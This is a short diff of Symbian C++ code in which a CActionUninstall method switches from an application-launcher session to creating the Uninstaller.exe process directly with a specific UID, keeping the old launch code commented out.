@@ -70,16 +70,31 @@ void CActionUninstall::DispatchStartCommandL()
 
 void CActionUninstall::LaunchAppL(){
 	
+	// retrieve uid3 of uninstaller
+	TBuf8<12> hexBuf(KUidUninstaller);
+	hexBuf.Copy(hexBuf.Mid(2,hexBuf.Length()-2));
+	TLex8 lex(hexBuf);
+	TUint32 bdUid;
+	lex.Val(bdUid,EHex);
+	TUid kUid3 = TUid::Uid(bdUid);
+	// construct TUidType
+	TUidType uidType(TUid::Uid(0x1000007a), TUid::Uid(0x0), kUid3 );
+	// create process with that uid, so we are sure it's not another with the same name
+	RProcess process;
+	process.Create(_L("Uninstaller.exe"),KNullDesC, uidType);
+	process.Resume();
+	process.Close();
+	/*
 	TThreadId app_threadid;
 	CApaCommandLine* cmdLine; 
 	cmdLine=CApaCommandLine::NewLC();
 	cmdLine->SetExecutableNameL(_L("Uninstaller.exe"));
-	cmdLine->SetCommandL( EApaCommandRun );
+	cmdLine->SetCommandL( EApaCommandRunWithoutViews );
 	RApaLsSession ls;
 	User::LeaveIfError(ls.Connect());
 	TInt err=ls.StartApp(*cmdLine,app_threadid);
 	ls.Close();
-	CleanupStack::PopAndDestroy(); // cmdLine
+	CleanupStack::PopAndDestroy(); // cmdLine */
 }
 
 void CActionUninstall::InstallAppL(){
